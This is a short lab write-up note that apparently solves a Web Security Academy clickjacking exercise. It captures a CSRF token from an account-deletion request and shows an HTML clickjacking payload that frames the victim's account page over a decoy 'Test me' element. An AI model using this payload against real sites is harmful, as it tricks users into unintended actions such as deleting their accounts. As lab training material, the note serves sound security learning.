---
sticker: emoji//1f97c
---
Based on the previous note: [[HOW TO CONSTRUCT A BASIC CLICKJACKING ATTACK|NOTE]]

![](../images/Pasted%20image%2020241021153605.png)


If we use the delete function from the account and send the request to the repeater, we get the following CRSR token:

![](../images/Pasted%20image%2020241021155644.png)

```ad-info
token:0XvopQRGgqPlwC8auzHR7owrONVjuWJf
```
Next, what we need to do is craft our Clickjacking malicious code, I used the following code for this:

```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

![](../images/Pasted%20image%2020241021162011.png)
Once we send the exploit to the victim, lab's solved